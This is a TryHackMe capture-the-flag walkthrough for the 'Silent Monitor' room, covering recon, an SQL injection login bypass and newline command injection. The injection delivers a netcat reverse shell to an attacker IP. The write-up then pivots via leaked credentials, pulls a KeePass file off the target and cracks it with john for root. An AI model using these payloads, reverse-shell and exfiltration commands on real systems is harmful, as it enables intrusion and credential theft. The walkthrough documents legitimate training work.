# TryHackMe - Silent Monitor

> *These notes were written with AI assistance for English clarity. Attack paths and commands reflect my own work on the room.*

**Difficulty:** Medium  
**Category:** Web, SQLi, Command Injection, Pivoting, Password Cracking  
**Room:** [Silent Monitor](https://tryhackme.com/room/silent-monitor)  
**Description:** Enumerate a running internal service, exploit a vulnerable web application, pivot through the system, and crack your way to root.

## Introduction

CorpNet's NOC portal looks healthy — green lights, clean audit logs. Your job is to find what is really running behind the internal dashboard.

**Objectives:**
- Discover the non-standard web service
- Bypass authentication and achieve RCE
- Pivot to `sysadmin` via leaked credentials
- Crack a KeePass vault and escalate to `root`

---

## Reconnaissance

```bash
nmap -sV -sC -p- -T4 <TARGET_IP>
```

| Port | Service |
|------|---------|
| 22 | SSH |
| 5050 | HTTP (NOC monitoring portal) |

Add to `/etc/hosts`:

```
<TARGET_IP>  silent-monitor.thm
```

The main site on port **5050** looks static. Directory discovery reveals `/internal` — a login form for the NOC dashboard.

```bash
feroxbuster -u http://silent-monitor.thm:5050/ -w /usr/share/wordlists/dirb/common.txt
```

---

## Stage 1 — SQL Injection Login Bypass

Intercept the login POST to `/internal` and fuzz SQLi payloads on the `username` field.

Working bypass:

```
' or 1 or '
```

```bash
curl -c cookies.txt -X POST "http://silent-monitor.thm:5050/internal" \
  -d "username=' or 1 or '&password=x" -L
```

You are redirected to `/internal/health` and the dashboard at `/internal/dashboard#audit`.

The audit log hints that a previous attacker used **command injection with a newline** on the health endpoint.

---

## Stage 2 — Command Injection → Shell as www-data

The `/internal/health` endpoint passes user input to a system check. Filters block common metacharacters, but a **literal newline** (not URL-encoded `%0a` in all cases) injects a second command.

Start a listener:

```bash
penelope -p 4445
# or: nc -lvnp 4445
```

Payload (newline before the command):

```
busybox nc <ATTACKER_IP> 4445 -e bash
```

Submit via the health form or:

```bash
curl -b cookies.txt -X POST "http://silent-monitor.thm:5050/internal/health" \
  --data-binary $'host=127.0.0.1\nbusybox nc <ATTACKER_IP> 4445 -e bash&check=1'
```

> Outbound connectivity is limited — use your VPN/Attack Box IP. `busybox nc` is required on the target.

Stabilize:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

---

## Stage 3 — Pivot to sysadmin

In the web root (or current working directory of the app), find `secret.config`:

```bash
find / -name 'secret.config' 2>/dev/null
cat secret.config
```

Credentials for **sysadmin** are inside. `su` from the reverse shell may fail (non-TTY); use SSH instead:

```bash
ssh sysadmin@silent-monitor.thm
cat ~/user.txt
```

**User flag:** `~/user.txt`

---

## Stage 4 — KeePass → Root

Locate the backup database:

```bash
find / -name 'infrastructure.kdbx' 2>/dev/null
# typically under a backups/ directory
```

Exfiltrate — serve from target, pull from attacker:

```bash
# on target
cd /path/to/backups && python3 -m http.server 8080

# on attacker
wget http://silent-monitor.thm:8080/infrastructure.kdbx
```

Crack the master password:

```bash
keepass2john infrastructure.kdbx > kdbx.hash
john --wordlist=/usr/share/wordlists/rockyou.txt kdbx.hash
```

Open the vault (KeePassXC, `kpcli`, or `keepassxc-cli`) and retrieve the **root** password.

```bash
su root
cat /root/root.txt
```

**Root flag:** `/root/root.txt`

---

## Attack Chain Summary

```
Recon (5050)
  └─> /internal SQLi (' or 1 or ')
        └─> /internal/health command injection (newline)
              └─> reverse shell as www-data
                    └─> secret.config → SSH sysadmin → user.txt
                          └─> infrastructure.kdbx → john rockyou
                                └─> su root → root.txt
```

---

## References

- [0xb0b Writeup](https://0xb0b.gitbook.io/writeups/tryhackme/2026/silent-monitor)
- [HackTricks SQL Login Bypass](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/login-bypass/sql-login-bypass.md)
